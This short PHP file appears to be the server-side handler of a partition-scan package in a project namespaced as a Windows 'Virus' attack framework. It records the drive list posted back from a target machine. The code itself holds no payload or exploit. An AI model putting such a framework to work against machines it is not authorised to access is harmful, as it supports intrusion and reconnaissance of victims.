<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ScanPartitions\ScanPartitions $this */

$drives = $this->requestData->postCheck("drives");
$this->setAvailableDrives($drives);
$this->setExecuted();
